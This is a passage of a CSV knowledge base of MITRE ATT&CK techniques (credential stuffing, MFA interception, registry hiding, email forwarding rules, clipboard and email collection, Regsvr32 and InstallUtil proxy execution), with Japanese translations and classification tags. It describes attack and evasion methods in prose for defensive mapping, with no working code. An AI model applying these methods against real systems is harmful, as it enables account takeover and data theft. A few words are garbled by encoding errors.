Intrusion,TA0006,attack-pattern--692074ae-bb62-4a5e-a735-02cb6bde458c,2020-02-11T18:39:25.122Z,2025-04-15T19:58:38.420Z,,,,
T1110.004,T1110,Credential Stuffing,クレデンシャルスタッフィング,"Adversaries may use credentials obtained from breach dumps of unrelated accounts to gain access to target accounts through credential overlap. Occasionally, large numbers of username and password pairs are dumped online when a website or service is compromised and the user account credentials accessed. The information may be useful to an adversary attempting to compromise accounts by taking advantage of the tendency for users to use the same passwords across personal and business accounts. Credential stuffing is a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. Typically, management services over commonly used ports are used when stuffing credentials. Commonly targeted services include the following: * SSH (22/TCP) * Telnet (23/TCP) * FTP (21/TCP) * NetBIOS / SMB / Samba (139/TCP & 445/TCP) * LDAP (389/TCP) * Kerberos (88/TCP) * RDP / Terminal Services (3389/TCP) * HTTP/HTTP Management Services (80/TCP & 443/TCP) * MSSQL (1433/TCP) * Oracle (1521/TCP) * MySQL (3306/TCP) * VNC (5900/TCP) In addition to management services, adversaries may ""target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,"" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018)",攻撃者は、無関係なアカウントの侵害ダンプから取得した認証情報を、認証情報の重複を利用して標的アカウントへのアクセスに悪用する可能性があります。ウェブサイトやサービスが侵害されユーザーアカウントの認証情報がアクセスされた場合、大量のユーザー名とパスワードの組み合わせがオンライン上に流出することがあります。この情報は、ユーザーが個人用と業務用アカウントで同じパスワードを使用する傾向を利用し、アカウント侵害を試みる攻撃者にとって有用となる可能性があります。 クレデンシャルスタッフィングは、組織のログイン失敗ポリシーによっては多数の認証失敗やアカウントロックアウトを引き起こす可能性があるため、リスクの高い手法である。通常、スタッフィングには一般的なポート上の管理サービスが利用される。 標的とされる代表的なサービスは以下の通り：* SSH (22/TCP)* Telnet (23/TCP)* FTP (21/TCP)* NetBIOS / SMB / Samba (139/TCP & 445/TCP)* LDAP (389/TCP) * Kerberos (88/TCP) * RDP / ターミナルサービス (3389/TCP) * HTTP/HTTP管理サービス (80/TCP & 443/TCP) * MSSQL (1433/TCP) * Oracle (1521/TCP) * MySQL (3306/TCP) * VNC (5900/TCP) 管理サービスに加え、攻撃者は「フェデレーション認証プロトコルを利用するシングルサインオン（SSO）およびクラウドベースのアプリケーション」や、Office 365などの外部向けメールアプリケーションを標的とする可能性がある。（出典: US-CERT TA18-068A 2018）,credential-access,Windows;SaaS;IaaS;Linux;macOS;Containers;Network Devices;Office Suite;Identity Provider;ESXi,credential_abuse,credential_gain,authentication_system;identity_federation;user_interaction;network_connectivity;email_infrastructure;cloud_control_plane;saas_in_use;database_access;logging_monitoring,specified,AD / Directory Server;Business Workstation;File Server;Identity / SaaS (IdP/SSO);Log / Monitoring Server;Mail / Collaboration;Management Console for GovCloud;Network Device (FW/Proxy/AP);Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0006,attack-pattern--b2d03cea-aec1-45ca-9744-9ee583c1e1cc,2020-02-11T18:39:59.959Z,2025-04-15T19:58:59.077Z,,,,
T1111,,Multi-Factor Authentication Interception,多要素認証の傍受,"Adversaries may target multi-factor authentication (MFA) mechanisms, (i.e., smart cards, token generators, etc.) to gain access to credentials that can be used to access systems, services, and network resources. Use of MFA is recommended and provides a higher level of security than usernames and passwords alone, but organizations should be aware of techniques that could be used to intercept and bypass these security mechanisms. If a smart card is used for multi-factor authentication, then a keylogger will need to be used to obtain the password associated with a smart card during normal use. With both an inserted card and access to the smart card password, an adversary can connect to a network resource using the infected system to proxy the authentication with the inserted hardware token. (Citation: Mandiant M Trends 2011) Adversaries may also employ a keylogger to similarly target other hardware tokens, such as RSA SecurID. Capturing token input (including a user's personal identification code) may provide temporary access (i.e. replay the one-time passcode until the next value rollover) as well as possibly enabling adversaries to reliably predict future authentication values (given access to both the algorithm and any seed values used to generate appended temporary codes). (Citation: GCN RSA June 2011) Other methods of MFA may be intercepted and used by an adversary to authenticate. It is common for one-time codes to be sent via out-of-band communications (email, SMS). If the device and/or service is not secured, then it may be vulnerable to interception. Service providers can also be targeted: for example, an adversary may compromise an SMS messaging service in order to steal MFA codes sent to users Ephones.(Citation: Okta Scatter Swine 2022)",攻撃者は、システム、サービス、ネットワークリソースへのアクセスに使用できる認証情報を取得するために、多要素認証（MFA）メカニズム（例：スマートカード、トークン生成器など）を標的とする可能性があります。 MFAの使用は推奨され、ユーザー名とパスワードのみの場合よりも高いセキュリティレベルを提供しますが、組織はこれらのセキュリティメカニズムを傍受・回避するために使用される可能性のある手法を認識しておく必要があります。スマートカードが多要素認証に使用されている場合、通常の使用中にスマートカードに関連付けられたパスワードを取得するにはキーロガーを使用する必要があります。 挿入されたカードとスマートカードパスワードの両方にアクセスできれば、攻撃者は感染システムを介してネットワークリソースに接続し、挿入されたハードウェアトークンによる認証をプロキシできます（出典：Mandiant M Trends 2011）。攻撃者は同様に、RSA SecurIDなどの他のハードウェアトークンを標的とするためにキーロガーを使用する可能性があります。 トークン入力（ユーザーの個人識別コードを含む）を捕捉することで、一時的なアクセス（例：次回値更新までワンタイムパスコードを再生）が可能になるほか、アルゴリズムと付加される一時コード生成に使用されるシード値の両方にアクセスできれば、将来の認証値を確実に予測できる可能性がある。 （引用元：GCN RSA 2011年6月）その他のMFA手法も、攻撃者による傍受・悪用による認証に利用される可能性がある。ワンタイムコードは帯域外通信（メール、SMS）で送信されるのが一般的である。デバイスやサービスが保護されていない場合、傍受の危険性がある。 サービスプロバイダー自体も標的となり得る：例えば、攻撃者がSMSメッセージングサービスを侵害し、ユーザー宛てのMFAコードを盗むケースがある Ephones.(引用元: Okta Scatter Swine 2022),credential-access,Linux;Windows;macOS,credential_abuse,credential_gain,authentication_system;mfa_in_use;user_interaction;network_connectivity;email_infrastructure;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Mail / Collaboration;Proxy / Gateway;Server (On-Prem/VM),has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0006,attack-pattern--dd43c543-bb85-4a6f-aa6e-160d90d06a49,2017-05-31T21:31:23.195Z,2025-04-15T22:50:08.274Z,,,,
T1112,,Modify Registry,レジストリの改変,"Adversaries may interact with the Windows Registry as part of a variety of other techniques to aid in defense evasion, persistence, and execution. Access to specific areas of the Registry depends on account permissions, with some keys requiring administrator-level access. The built-in Windows command-line utility [Reg](https://attack.mitre.org/software/S0075) may be used for local or remote Registry modification.(Citation: Microsoft Reg) Other tools, such as remote access tools, may also contain functionality to interact with the Registry through the Windows API. The Registry may be modified in order to hide configuration information or malicious payloads via [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027).(Citation: Unit42 BabyShark Feb 2019)(Citation: Avaddon Ransomware 2021)(Citation: Microsoft BlackCat Jun 2022)(Citation: CISA Russian Gov Critical Infra 2018) The Registry may also be modified to [Impair Defenses](https://attack.mitre.org/techniques/T1562), such as by enabling macros for all Microsoft Office products, allowing privilege escalation without alerting the user, increasing the maximum number of allowed outbound requests, and/or modifying systems to store plaintext credentials in memory.(Citation: CISA LockBit 2023)(Citation: Unit42 BabyShark Feb 2019) The Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system.(Citation: Microsoft Remote) Often [Valid Accounts](https://attack.mitre.org/techniques/T1078) are required, along with access to the remote system's [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) for RPC communication. Finally, Registry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via [Reg](https://attack.mitre.org/software/S0075) or other utilities using the Win32 API.(Citation: Microsoft Reghide NOV 2006) Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence.(Citation: TrendMicro POWELIKS AUG 2014)(Citation: SpectorOps Hiding Reg Jul 2017)",攻撃者は防御回避、永続化、実行を支援するため、他の様々な手法の一環としてWindowsレジストリを操作することがあります。 レジストリの特定領域へのアクセスはアカウント権限に依存し、一部のキーには管理者レベルのアクセスが必要です。組み込みのWindowsコマンドラインユーティリティ[Reg](https://attack.mitre.org/software/S0075)は、ローカルまたはリモートのレジストリ変更に使用できます。(引用元: Microsoft Reg) リモートアクセスツールなどの他のツールも、Windows APIを介してレジストリとやり取りする機能を含む場合があります。 レジストリは、[難読化されたファイルや情報](https://attack.mitre.org/techniques/T1027)を介して構成情報や悪意のあるペイロードを隠蔽するために改変される可能性があります。(引用元: Unit42 BabyShark 2019年2月)(引用元: Avaddonランサムウェア 2021年)(引用元: Microsoft BlackCat 2022年6月)(引用元: CISA Russian Gov Critical Infra 2018) レジストリはまた、[防御機能の無効化](https://attack.mitre.org/techniques/T1562)を目的として改変される可能性があります。具体的には、全てのMicrosoft Office製品でマクロを有効化したり、ユーザーに警告せずに権限昇格を許可したり、許可される最大アウトバウンドリクエスト数を増加させたり、システムを改変して平文の認証情報をメモリに保存させたりするなどの手法が用いられます。(引用元: CISA LockBit 2023)(引用元: Unit42 BabyShark 2019年2月) リモートシステムのリジストリは、横方向移動の一環としてファイル実行を支援するために改変される可能性がある。これにはターゲットシステム上でリモートレジストリサービスが稼働している必要がある。(引用: Microsoft Remote) 多くの場合、[有効なアカウント](https://attack.mitre.org/techniques/T1078) と、RPC通信のためのリモートシステム上の[SMB/Windows管理共有](https://attack.mitre.org/techniques/T1021/002)へのアクセスが必要となる。 最後に、レジストリ変更にはキーを隠蔽する操作も含まれる。例えばキー名にヌル文字を前置することで、[Reg](https://attack.mitre.org/software/S0075)やWin32 APIを利用する他のユーティリティによる読み取り時にエラー発生や無視を引き起こす。(引用元: Microsoft Reghide NOV 2006) 攻撃者は、これらの疑似隠蔽キーを悪用し、持続性を維持するために使用されるペイロード/コマンドを隠蔽する可能性があります。(引用元: TrendMicro POWELIKS AUG 2014)(引用元: SpectorOps Hiding Reg Jul 2017),defense-evasion;persistence,Windows,credential_abuse,stealth,authentication_system;privileged_account;user_interaction;endpoint_execution;network_connectivity;cloud_control_plane;file_storage_access;logging_monitoring,specified,Business Workstation;File Server;Server (On-Prem/VM),has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005;TA0003,attack-pattern--57340c81-c025-4189-8fa0-fc7ede51bae4,2017-05-31T21:31:23.587Z,2025-04-15T19:58:33.486Z,,,,
T1113,,Screen Capture,スクリーンキャプチャ,"Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation. Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations. Taking a screenshot is also typically possible through native utilities or API calls, such as <code>CopyFromScreen</code>, <code>xwd</code>, or <code>screencapture</code>.(Citation: CopyFromScreen .NET)(Citation: Antiquated Mac Malware)",攻撃者は、操作の過程で情報を収集するために、デスクトップのスクリーンキャプチャを試みる場合があります。 スクリーンキャプチャ機能は、侵害後の操作で使用されるリモートアクセスツールの機能として含まれる場合があります。スクリーンショットの取得は、<code>CopyFromScreen</code>、<code>xwd</code>、<code>screencapture</code>などのネイティブユーティリティやAPI呼び出しを通じて通常可能です。(引用: CopyFromScreen .NET)(引用: 旧式のMacマルウェア),collection,Linux;macOS;Windows,data_collection,asset_access,network_connectivity;cloud_control_plane,specified,Business Workstation;Server (On-Prem/VM),has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0009,attack-pattern--0259baeb-9f63-4c69-bf10-eb038c390688,2017-05-31T21:31:25.060Z,2025-04-15T23:03:14.254Z,,,,
T1114,,Email Collection,電子メール収集,"Adversaries may target user email to collect sensitive information. Emails may contain sensitive data, including trade secrets or personal information, that can prove valuable to adversaries. Emails may also contain details of ongoing incident response operations, which may allow adversaries to adjust their techniques in order to maintain persistence or evade defenses.(Citation: TrustedSec OOB Communications)(Citation: CISA AA20-352A 2021) Adversaries can collect or forward email from mail servers or clients.",攻撃者は機密情報を収集するため、ユーザーの電子メールを標的とする可能性があります。電子メールには、攻撃者にとって価値のある企業秘密や個人情報などの機密データが含まれている場合があります。 また、進行中のインシデント対応活動の詳細が含まれている場合もあり、敵対者はこれを基に、持続性を維持したり防御を回避したりするために手法を調整する可能性があります。(引用: TrustedSec OOB Communications)(引用: CISA AA20-352A 2021)敵対者は、メールサーバーやクライアントからメールを収集または転送することができます。,collection,Windows;macOS;Linux;Office Suite,data_collection,asset_access,user_interaction;email_infrastructure,specified,Business Workstation;Identity / SaaS (IdP/SSO);Mail / Collaboration;Management Console for GovCloud;Server (On-Prem/VM),has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0009,attack-pattern--1608f3e1-598a-42f4-a01a-2e252e81728f,2017-05-31T21:31:25.454Z,2025-04-15T22:26:37.477Z,,,,
T1114.001,T1114,Local Email Collection,ローカルメール収集,"Adversaries may target user email on local systems to collect sensitive information. Files containing email data can be acquired from a user’s local system, such as Outlook storage or cache files. Outlook stores data locally in offline data files with an extension of .ost. Outlook 2010 and later supports .ost file sizes up to 50GB, while earlier versions of Outlook support up to 20GB.(Citation: Outlook File Sizes) IMAP accounts in Outlook 2013 (and earlier) and POP accounts use Outlook Data Files (.pst) as opposed to .ost, whereas IMAP accounts in Outlook 2016 (and later) use .ost files. Both types of Outlook data files are typically stored in `C:\Users\<username>\Documents\Outlook Files` or `C:\Users\<username>\AppData\Local\Microsoft\Outlook`.(Citation: Microsoft Outlook Files)",敵対者は、機密情報を収集するためにローカルシステム上のユーザーメールを標的とする可能性があります。メールデータを含むファイルは、Outlookストレージやキャッシュファイルなど、ユーザーのローカルシステムから取得できます。Outlookはデータをローカルに保存し、拡張子.ostのオフラインデータファイルとして保持します。 Outlook 2010以降では最大50GBの.ostファイルサイズをサポートするが、それ以前のバージョンでは最大20GBまでである。(引用元: Outlook File Sizes) Outlook 2013（およびそれ以前）のIMAPアカウントとPOPアカウントは.ostではなくOutlookデータファイル（.pst）を使用する一方、Outlook 2016（およびそれ以降）のIMAPアカウントは.ostファイルを使用する。 どちらのタイプの Outlook データファイルも、通常 `C:\Users\<username>\Documents\Outlook Files` または `C:\Users\<username>\AppData\Local\Microsoft\Outlook` に保存されます。(引用元: Microsoft Outlook Files),collection,Windows,data_collection,asset_access,authentication_system;user_interaction;email_infrastructure;file_storage_access,specified,Business Workstation;Mail / Collaboration;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0009,attack-pattern--1e9eb839-294b-48cc-b0d3-c45555a2a004,2020-02-19T18:46:06.098Z,2025-04-25T14:46:00.964Z,,,,
T1114.002,T1114,Remote Email Collection,リモートメール収集,"Adversaries may target an Exchange server, Office 365, or Google Workspace to collect sensitive information. Adversaries may leverage a user's credentials and interact directly with the Exchange server to acquire information from within a network. Adversaries may also access externally facing Exchange services, Office 365, or Google Workspace to access email using credentials or access tokens. Tools such as [MailSniper](https://attack.mitre.org/software/S0413) can be used to automate searches for specific keywords.",攻撃者は、機密情報を収集するために Exchange サーバー、Office 365、または Google Workspace を標的にする可能性があります。 攻撃者はユーザーの認証情報を悪用し、Exchange サーバーと直接やり取りしてネットワーク内部から情報を取得する可能性があります。また、外部向け Exchange サービス、Office 365、Google Workspace にアクセスし、認証情報やアクセストークンを使用してメールにアクセスする可能性があります。[MailSniper](https://attack.mitre.org/software/S0413) などのツールを使用して、特定のキーワードの検索を自動化できます。,collection,Windows;Office Suite,credential_abuse,asset_access,authentication_system;user_interaction;network_connectivity;email_infrastructure;saas_in_use,specified,Business Workstation;Identity / SaaS (IdP/SSO);Mail / Collaboration;Management Console for GovCloud;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0009,attack-pattern--b4694861-542c-48ea-9eb1-10d356e7140a,2020-02-19T18:52:24.547Z,2025-04-15T22:59:50.429Z,,,,
T1114.003,T1114,Email Forwarding Rule,メール転送ルール,"Adversaries may setup email forwarding rules to collect sensitive information. Adversaries may abuse email forwarding rules to monitor the activities of a victim, steal information, and further gain intelligence on the victim or the victim’s organization to use as part of further exploits or operations.(Citation: US-CERT TA18-068A 2018) Furthermore, email forwarding rules can allow adversaries to maintain persistent access to victim's emails even after compromised credentials are reset by administrators.(Citation: Pfammatter - Hidden Inbox Rules) Most email clients allow users to create inbox rules for various email functions, including forwarding to a different recipient. These rules may be created through a local email application, a web interface, or by command-line interface. Messages can be forwarded to internal or external recipients, and there are no restrictions limiting the extent of this rule. Administrators may also create forwarding rules for user accounts with the same considerations and outcomes.(Citation: Microsoft Tim McMichael Exchange Mail Forwarding 2)(Citation: Mac Forwarding Rules) Any user or administrator within the organization (or adversary with valid credentials) can create rules to automatically forward all received messages to another recipient, forward emails to different locations based on the sender, and more. Adversaries may also hide the rule by making use of the Microsoft Messaging API (MAPI) to modify the rule properties, making it hidden and not visible from Outlook, OWA or most Exchange Administration tools.(Citation: Pfammatter - Hidden Inbox Rules) In some environments, administrators may be able to enable email forwarding rules that operate organization-wide rather than on individual inboxes. For example, Microsoft Exchange supports transport rules that evaluate all mail an organization receives against user-specified conditions, then performs a user-specified action on mail that adheres to those conditions.(Citation: Microsoft Mail Flow Rules 2023) Adversaries that abuse such features may be able to enable forwarding on all or specific mail an organization receives.",攻撃者は機密情報を収集するためメール転送ルールを設定する可能性がある。 攻撃者はメール転送ルールを悪用し、被害者の活動を監視、情報を窃取し、さらなる攻撃や作戦に利用するため、被害者またはその組織に関する情報を収集する可能性があります。(出典: US-CERT TA18-068A 2018) さらに、メール転送ルールにより、管理者が侵害された認証情報をリセットした後でも、攻撃者が被害者のメールへの持続的なアクセスを維持できる場合があります。(出典: Pfammatter - Hidden Inbox Rules) ほとんどのメールクライアントでは、別の受信者への転送を含む各種メール機能のための受信箱ルールを作成できます。これらのルールはローカルメールアプリケーション、Webインターフェース、またはコマンドラインインターフェースを通じて作成可能です。メッセージは内部または外部の受信者に転送でき、このルールの適用範囲を制限する制約はありません。 管理者も同様の考慮事項と結果のもと、ユーザーアカウントの転送ルールを作成できる。(引用元: Microsoft Tim McMichael Exchange Mail Forwarding 2)(引用元: Mac Forwarding Rules) 組織内のユーザーや管理者（または有効な認証情報を持つ攻撃者）は、受信した全メッセージを別の受信者に自動転送するルール、送信者に基づいてメールを異なる場所へ転送するルールなどを作成できる。 攻撃者はMicrosoft Messaging API（MAPI）を利用してルールプロパティを変更し、Outlook、OWA、またはほとんどのExchange管理ツールから不可視となるようルールを隠蔽することも可能です。（引用元：Pfammatter - Hidden Inbox Rules）環境によっては、管理者が個々の受信箱ではなく組織全体で動作するメール転送ルールを有効化できる場合があります。 たとえば、Microsoft Exchange は、組織が受信するすべてのメールをユーザー指定の条件で評価し、その条件に合致するメールに対してユーザー指定のアクションを実行するトランスポートルールをサポートしています（引用元：Microsoft Mail Flow Rules 2023）。このような機能を悪用する攻撃者は、組織が受信するすべてのメールまたは特定のメールの転送を有効にできる可能性があります。,collection,Windows;macOS;Linux;Office Suite,credential_abuse,asset_access,authentication_system;privileged_account;user_interaction;endpoint_execution;email_infrastructure;cloud_control_plane;logging_monitoring,specified,Business Workstation;Identity / SaaS (IdP/SSO);Mail / Collaboration;Management Console for GovCloud;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0009,attack-pattern--7d77a07d-02fe-4e88-8bd9-e9c008c01bf0,2020-02-19T18:54:47.103Z,2025-04-15T22:26:55.201Z,,,,
T1115,,Clipboard Data,クリップボードデータ,"Adversaries may collect data stored in the clipboard from users copying information within or between applications. For example, on Windows adversaries can access clipboard data by using <code>clip.exe</code> or <code>Get-Clipboard</code>.(Citation: MSDN Clipboard)(Citation: clip_win_server)(Citation: CISA_AA21_200B) Additionally, adversaries may monitor then replace users Eclipboard with their data (e.g., [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002)).(Citation: mining_ruby_reversinglabs) macOS and Linux also have commands, such as <code>pbpaste</code>, to grab clipboard contents.(Citation: Operating with EmPyre)",攻撃者は、アプリケーション内またはアプリケーション間で情報をコピーするユーザーから、クリップボードに保存されたデータを収集する可能性があります。例えば、Windows では攻撃者は <code>clip.exe</code> または <code>Get-Clipboard</code> を使用してクリップボードデータにアクセスできます。(引用元: MSDN Clipboard)(引用元: clip_win_server)(引用元: CISA_AA21_200B) さらに、攻撃者はユーザーのクリップボード内容を監視し、自身のデータで置き換える可能性がある（例: [送信データ改ざん](https://attack.mitre.org/techniques/T1565/002)）。(引用: mining_ruby_reversinglabs) macOS および Linux にも、<code>pbpaste</code> などのクリップボードの内容を取得するコマンドがあります。(引用: Operating with EmPyre),collection,Linux;Windows;macOS,script_command_execution,asset_access,user_interaction;endpoint_execution;logging_monitoring,specified,Business Workstation;Server (On-Prem/VM),has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0009,attack-pattern--30973a08-aed9-4edf-8604-9084ce1b5c4f,2017-05-31T21:31:25.967Z,2025-04-15T21:57:50.289Z,,,,
T1116,,Code Signing,コード署名,"Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. (Citation: Wikipedia Code Signing) However, adversaries are known to use code signing certificates to masquerade malware and tools as legitimate binaries (Citation: Janicab). The certificates used during an operation may be created, forged, or stolen by the adversary. (Citation: Securelist Digital Certificates) (Citation: Symantec Digital Certificates) Code signing to verify software on first run can be used on modern Windows and macOS/OS X systems. It is not used on Linux due to the decentralized nature of the platform. (Citation: Wikipedia Code Signing) Code signing certificates may be used to bypass security policies that require signed code to execute on a system.",コード署名により、開発者からのバイナリに対する信頼性と、バイナリが改ざんされていないことの保証が提供されます。(引用元: Wikipedia Code Signing) しかし、攻撃者がコード署名証明書を利用してマルウェアやツールを正当なバイナリに偽装することが知られています(引用元: Janicab)。攻撃者が作成、偽造、または盗んだ証明書が攻撃に使用される可能性があります。 (引用元: Securelist デジタル証明書) (引用元: Symantec デジタル証明書) 初回実行時のソフトウェア検証を目的としたコード署名は、現代のWindowsおよびmacOS/OS Xシステムで利用可能です。プラットフォームの分散型性質のため、Linuxでは使用されません。(引用元: Wikipedia コード署名) コード署名証明書は、署名済みコードの実行を要求するセキュリティポリシーを迂回するために使用される可能性があります。,defense-evasion,macOS;Windows,defense_disable,stealth,authentication_system;endpoint_execution,specified,Business Workstation;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--1b84d551-6de8-4b96-9930-d177677c3b1d,2017-05-31T21:31:26.474Z,2025-04-25T15:15:13.106Z,,,,
T1117,,Regsvr32,Regsvr32,"Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. Regsvr32.exe can be used to execute arbitrary binaries. (Citation: Microsoft Regsvr32) Adversaries may take advantage of this functionality to proxy execution of code to avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of whitelists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe is also a Microsoft signed binary. Regsvr32.exe can also be used to specifically bypass process whitelisting using functionality to load COM scriptlets to execute DLLs under user permissions. Since regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed. (Citation: LOLBAS Regsvr32) This variation of the technique is often referred to as a ""Squiblydoo"" attack and has been used in campaigns targeting governments. (Citation: Carbon Black Squiblydoo Apr 2016) (Citation: FireEye Regsvr32 Targeting Mongolian Gov) Regsvr32.exe can also be leveraged to register a COM Object used to establish Persistence via [Component Object Model Hijacking](https://attack.mitre.org/techniques/T1122). (Citation: Carbon Black Squiblydoo Apr 2016)",Regsvr32.exe は、Windows システム上でダイナミックリンクライブラリ (DLL) を含むオブジェクトリンクおよび埋め込みコントロールを登録および登録解除するために使用されるコマンドラインプログラムです。Regsvr32.exe は任意のバイナリを実行するために使用される可能性があります。 (引用元: Microsoft Regsvr32) 攻撃者はこの機能を利用し、コード実行をプロキシすることでセキュリティツールの検知を回避する可能性があります。Windowsが通常動作でregsvr32.exeを使用する場合、ホワイトリストや誤検知により、regsvr32.exeプロセス自身の実行やロードされるモジュールが監視されないためです。Regsvr32.exeはまた、Microsoft署名付きバイナリでもあります。 regsvr32.exe は、COM スクリプトレットをロードする機能を利用してユーザー権限で DLL を実行することで、プロセスホワイトリストを意図的に回避することも可能です。regsvr32.exe はネットワークとプロキシを認識するため、外部 Web サーバー上のファイルへの統一リソースロケータ (URL) を引数として渡すことでスクリプトをロードできます。この方法では、COM オブジェクトが実際に登録されるのではなく実行されるだけであるため、レジストリに変更は加えられません。 (引用元: LOLBAS Regsvr32) この手法の変種は「スクイブルドゥー攻撃」として知られ、政府機関を標的としたキャンペーンで使用されてきた。 (引用元: Carbon Black Squiblydoo Apr 2016) (引用元: FireEye Regsvr32 Targeting Mongolian Gov) Regsvr32.exe は、[コンポーネントオブジェクトモデルハイジャック](https://attack.mitre.org/techniques/T1122) による永続化確立に使用される COM オブジェクトの登録にも悪用可能です。 (引用元: Carbon Black Squiblydoo 2016年4月),defense-evasion;execution,Windows,script_command_execution,stealth,user_interaction;endpoint_execution;network_connectivity;file_storage_access;logging_monitoring,specified,Business Workstation;Proxy / Gateway;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0005;TA0002,attack-pattern--68f7e3a1-f09f-4164-9a62-16b648a0dd5a,2017-05-31T21:31:26.966Z,2025-04-25T15:15:39.905Z,,,,
T1118,,InstallUtil,InstallUtil,InstallUtil is a command-line utility that allows for installation and uninstallation of resources by executing specific installer components specified in .NET binaries. (Citation: MSDN InstallUtil) InstallUtil is located in the .NET directories on a Windows system: <code>C:\Windows\Microsoft.NET\Framework\v<version>\InstallUtil.exe</code> and <code>C:\Windows\Microsoft.NET\Framework64\v<version>\InstallUtil.exe</code>. InstallUtil.exe is digitally signed by Microsoft. Adversaries may use InstallUtil to proxy execution of code through a trusted Windows utility. InstallUtil may also be used to bypass process whitelisting through use of attributes within the binary that execute the class decorated with the attribute <code>[System.ComponentModel.RunInstaller(true)]</code>. (Citation: LOLBAS Installutil),InstallUtil は、.NET バイナリで指定された特定のインストーラコンポーネントを実行してリソースのインストールおよびアンインストールを可能にするコマンドラインユーティリティです。 (引用元: MSDN InstallUtil)InstallUtil は、Windows システムの .NET ディレクトリ（<code>C:\Windows\Microsoft.NET\Framework\v<version>\InstallUtil.exe</code> および <code>C:\Windows\Microsoft.NET\Framework64\v<version>\InstallUtil.exe</code>）にあります。InstallUtil.exe は、Microsoft によってデジタル署名されています。 攻撃者は、信頼された Windows ユーティリティを介してコード実行をプロキシするために InstallUtil を使用する可能性があります。また、InstallUtil は、<code>[System.ComponentModel.RunInstaller(true)]</code> 属性で装飾されたクラスを実行するバイナリ内の属性を活用することで、プロセスホワイトリストをバイパスするために使用される可能性があります。(引用元: LOLBAS Installutil),defense-evasion;execution,Windows,script_command_execution,stealth,endpoint_execution;network_connectivity,specified,Business Workstation;Proxy / Gateway;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0005;TA0002,attack-pattern--f792d02f-813d-402b-86a5-ab98cb391d3b,2017-05-31T21:31:27.510Z,2025-04-25T15:16:24.168Z,,,,
T1119,,Automated Collection,自動収集,"Once established within a system or network, an adversary may use automated techniques for collecting internal data. Methods for performing this technique could include use of a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) to search for and copy information fitting set criteria such as file type, location, or name at specific time intervals. In cloud-based environments, adversaries may also use cloud APIs, data pipelines, command line interfaces, or extract, transform, and load (ETL) services to automatically collect data.(Citation: Mandiant UNC3944 SMS Phishing 2023) This functionality could also be built into remote access tools. This technique may incorporate use of other techniques such as [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) and [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570) to identify and move files, as well as [Cloud Service Dashboard](https://attack.mitre.org/techniques/T1538) and [Cloud Storage Object Discovery](https://attack.mitre.org/techniques/T1619) to identify resources in cloud environments.",システムまたはネットワーク内に侵入した攻撃者は、内部データを収集するために自動化された手法を使用する可能性があります。この手法を実行する方法には、[コマンドとスクリプトインタープリター](https://attack.mitre.org/techniques/T1059) を使用して、特定の時間間隔でファイルタイプ、場所、名前などの設定された基準に合致する情報を検索しコピーすることが含まれます。 クラウド環境では、攻撃者はクラウドAPI、データパイプライン、コマンドラインインターフェース、または抽出・変換・ロード（ETL）サービスを利用してデータを自動収集することもある。(引用元: Mandiant UNC3944 SMS Phishing 2023) この機能はリモートアクセスツールに組み込まれる場合もある。 この手法では、ファイルやディレクトリの発見（https://attack.mitre.org/techniques/T1083）や横方向のツール転送（https://attack.mitre.org/techniques/T1570）といった他の手法を組み合わせてファイルを特定・移動させたり、クラウドサービスダッシュボード（https://attack.mitre.org/techniques/T1538) や [クラウドストレージオブジェクトの発見](https://attack.mitre.org/techniques/T1619) などの手法を組み合わせて、クラウド環境内のリソースを特定する場合もある。,collection,Linux;macOS;Windows;IaaS;SaaS;Office Suite,script_command_execution,asset_access,user_interaction;endpoint_execution;network_connectivity;cloud_control_plane;file_storage_access,specified,Business Workstation;Identity / SaaS (IdP/SSO);Management Console for GovCloud;Server (On-Prem/VM),has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0009,attack-pattern--30208d3e-0d6b-43c8-883e-44462a514619,2017-05-31T21:31:27.985Z,2025-04-15T19:58:18.743Z,,,,
